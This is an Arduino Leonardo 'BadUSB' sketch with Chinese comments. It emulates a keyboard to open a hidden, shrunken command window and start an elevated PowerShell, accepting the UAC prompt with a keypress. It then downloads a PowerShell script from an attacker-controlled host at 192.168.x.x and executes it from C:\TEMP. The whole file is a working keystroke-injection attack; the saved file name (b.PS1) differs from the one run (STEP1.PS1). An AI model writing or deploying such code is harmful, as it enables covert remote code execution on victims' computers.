#include<Keyboard.h>
//Arduino Leonardo

void setup()
{ //初始化
Keyboard.begin();//开始键盘通信
delay(1000);//延时1000毫秒，
Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键
Keyboard.press('r');//按下r键 CMD
delay(500);
Keyboard.release(KEY_LEFT_GUI);//松掉win键
Keyboard.release('r');//松掉r键
delay(500);
Keyboard.println("cmd");
Keyboard.press(KEY_RETURN);  //按下回车键
Keyboard.release(KEY_RETURN); //释放回车键
delay(500);
Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1"); //缩小窗口
Keyboard.println("powershell.exe -command start-process powershell -verb runAs");  /*开启管理员级别的powershell*/
delay(2000);
Keyboard.press(KEY_LEFT_ARROW); //按住左方向键
Keyboard.release(KEY_LEFT_ARROW); //释放左方向键
delay(500);
Keyboard.press(KEY_RETURN); //按下回车键
Keyboard.release(KEY_RETURN);//释放enter键
delay(3000);
Keyboard.println("$P = nEW-oBJECT sYSTEM.nET.wEBcLIENT"); //利用powershell 定义一个对象
Keyboard.println("$P.dOWNLOADfILE('HTTP://192.168.x.x/a.PS1','C:\\TEMP\\b.PS1')");  /*从服务端下载Powershell脚本*/
Keyboard.println("C:\\TEMP\\STEP1.PS1");
Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1"); //缩小窗口
delay(500);
Keyboard.end();//结束键盘通讯
}

void loop()//循环，这里的代码
{
//循环体
}